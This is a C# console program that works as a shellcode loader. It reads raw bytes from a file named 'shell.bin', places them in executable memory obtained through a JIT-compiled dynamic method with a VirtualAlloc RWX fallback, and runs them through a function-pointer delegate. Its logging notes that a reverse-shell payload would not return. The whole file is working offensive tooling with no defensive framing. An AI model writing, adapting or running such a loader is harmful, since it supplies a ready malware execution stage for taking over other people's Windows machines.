using System;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace ConsoleApp1
{
    internal static class Program
    {
        private static void Main(string[] args)
        {
            try
            {
                UevAppClass.Execute();
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[!] FATAL: " + ex.GetType().Name + ": " + ex.Message);
                Console.Error.WriteLine(ex.StackTrace);
            }
        }
    }

    internal class UevAppClass
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate void Callback();

        public static void Execute()
        {
            string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "shell.bin");
            Console.WriteLine("[*] BaseDir = " + AppDomain.CurrentDomain.BaseDirectory);
            Console.WriteLine("[*] Looking for: " + path);

            if (!File.Exists(path))
            {
                Console.WriteLine("[-] shell.bin not found");
                return;
            }

            byte[] shellcode = File.ReadAllBytes(path);
            Console.WriteLine("[+] Read shell.bin: " + shellcode.Length + " bytes");
            Console.WriteLine("[*] IntPtr.Size = " + IntPtr.Size + " (host bitness)");

            IntPtr mem;
            try
            {
                mem = GenerateRWXMemory(shellcode.Length);
                int actualSize = MeasureBuffer(mem);
                Console.WriteLine("[+] RWX buffer @ 0x" + mem.ToInt64().ToString("X") +
                                  " (requested " + shellcode.Length + " bytes, actual " + actualSize + " bytes)");
                if (actualSize < shellcode.Length)
                {
                    Console.WriteLine("[-] Buffer too small, reallocating with safety margin");
                    mem = Realloc(mem, actualSize, shellcode.Length + 4096);
                    Console.WriteLine("[+] New buffer @ 0x" + mem.ToInt64().ToString("X"));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] GenerateRWXMemory failed: " + ex.GetType().Name + ": " + ex.Message);
                return;
            }

            try
            {
                CopyMemory(shellcode, mem);
                Console.WriteLine("[+] Shellcode copied to RWX buffer");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] CopyMemory failed: " + ex.GetType().Name + ": " + ex.Message);
                return;
            }

            byte[] verify = new byte[32];
            try
            {
                Marshal.Copy(mem, verify, 0, 32);
            }
            catch { }
            Console.WriteLine("[*] First 32 bytes @ mem: " + BitConverter.ToString(verify));
            Console.WriteLine("[*] First 8 bytes (IntPtr): 0x" + Marshal.ReadInt64(mem).ToString("X16"));

            Console.WriteLine("[*] Invoking shellcode...");
            Callback shellcodeDelegate = Marshal.GetDelegateForFunctionPointer<Callback>(mem);
            try
            {
                shellcodeDelegate();
                Console.WriteLine("[+] Shellcode returned (it should not return if it's a reverse shell)");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Invoke threw managed exception: " + ex.GetType().Name + ": " + ex.Message);
                Console.Error.WriteLine(ex.StackTrace);
            }
        }

        public static IntPtr GenerateRWXMemory(int ByteCount)
        {
            AssemblyName name = new AssemblyName("Assembly");
            AssemblyBuilder assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(name, AssemblyBuilderAccess.Run);
            ModuleBuilder moduleBuilder = assemblyBuilder.DefineDynamicModule("Module", true);
            MethodBuilder methodBuilder = moduleBuilder.DefineGlobalMethod(
                "MethodName",
                MethodAttributes.FamANDAssem | MethodAttributes.Family | MethodAttributes.Static,
                typeof(void),
                new Type[0]);
            ILGenerator ilgenerator = methodBuilder.GetILGenerator();

            Random random = new Random();
            int loops = 0;
            while (ByteCount > 0)
            {
                StringBuilder stringBuilder = new StringBuilder();
                for (int i = 0; i < 4; i++)
                {
                    int idx = Convert.ToInt32(Math.Floor(25.0 * random.NextDouble()));
                    stringBuilder.Append(Convert.ToChar(idx + 65));
                }
                ilgenerator.EmitWriteLine(stringBuilder.ToString());
                ByteCount -= 18;
                loops++;
            }
            Console.WriteLine("[*] EmitWriteLine loops: " + loops);
            ilgenerator.Emit(OpCodes.Ret);

            moduleBuilder.CreateGlobalFunctions();
            RuntimeMethodHandle methodHandle = moduleBuilder.GetMethods()[0].MethodHandle;
            RuntimeHelpers.PrepareMethod(methodHandle);
            return methodHandle.GetFunctionPointer();
        }

        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        private static extern void RtlMoveMemory(IntPtr dest, IntPtr src, IntPtr byteCount);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, IntPtr dwSize, uint flAllocationType, uint flProtect);

        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;

        private static int MeasureBuffer(IntPtr mem)
        {
            for (int n = 0; n < 4096; n++)
            {
                try
                {
                    byte b = Marshal.ReadByte(mem, n);
                    if (b == 0xC3)
                    {
                        byte b1 = n > 0 ? Marshal.ReadByte(mem, n - 1) : (byte)0;
                        byte b2 = n > 1 ? Marshal.ReadByte(mem, n - 2) : (byte)0;
                        if (b2 == 0xCC && b1 == 0xCC)
                            return n - 1;
                        if (b1 == 0xCC)
                            return n - 1;
                        return n + 1;
                    }
                }
                catch { return n; }
            }
            return 0;
        }

        private static IntPtr Realloc(IntPtr oldMem, int oldSize, int newSize)
        {
            IntPtr newMem = VirtualAlloc(IntPtr.Zero, (IntPtr)newSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            RtlMoveMemory(newMem, oldMem, (IntPtr)oldSize);
            return newMem;
        }

        public static void CopyMemory(byte[] source, IntPtr dest)
        {
            IntPtr src = Marshal.AllocHGlobal(source.Length);
            try
            {
                Marshal.Copy(source, 0, src, source.Length);
                RtlMoveMemory(dest, src, (IntPtr)source.Length);
            }
            finally
            {
                Marshal.FreeHGlobal(src);
            }
            Array.Clear(source, 0, source.Length);
        }
    }
}